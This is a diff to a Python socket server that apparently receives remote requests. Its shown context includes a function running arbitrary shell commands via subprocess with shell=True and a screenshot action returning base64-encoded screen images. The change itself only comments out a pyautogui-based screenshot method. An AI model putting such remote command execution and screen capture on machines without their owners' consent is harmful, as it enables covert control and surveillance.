@@ -7,9 +7,9 @@ import selectors
 import json
 import io
 import struct
-import numpy as np
-import cv2
-import pyautogui
+#import numpy as np
+#import cv2
+#import pyautogui
 import subprocess
 import base64
 
@@ -25,6 +25,7 @@ request_search = {
 def run_command(command):
     out, err = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
     return out + err
+
 
 class Message:
     def __init__(self, selector, sock, addr):
@@ -111,7 +112,7 @@ class Message:
             content = {"action": action, "result": answer}
         elif action == "screenshot":
             content_encoding = "utf-8"
-            self.take_screenshot()
+            #self.take_screenshot()
             imgbase64 = self.take_screenshotng()
             query = self.request.get("value")
             answer = "Screenshot taken" #request_search.get(query) or f'No match for "{query}".'
@@ -142,19 +143,19 @@ class Message:
         image_64_encode = base64.encodebytes(image_read)  # encodestring also works aswell as decodestring
         return image_64_encode
 
-    def take_screenshot(self):
+    #def take_screenshot(self):
         # take screenshot using pyautogui
-        image = pyautogui.screenshot()
+    #    image = pyautogui.screenshot()
 
         # since the pyautogui takes as a
         # PIL(pillow) and in RGB we need to
         # convert it to numpy array and BGR
         # so we can write it to the disk
-        image = cv2.cvtColor(np.array(image),
-                             cv2.COLOR_RGB2BGR)
+    #    image = cv2.cvtColor(np.array(image),
+    #                         cv2.COLOR_RGB2BGR)
 
         # writing it to the disk using opencv
-        cv2.imwrite("image1.png", image)
+    #    cv2.imwrite("image1.png", image)
 
     def _create_response_binary_content(self):
         response = {
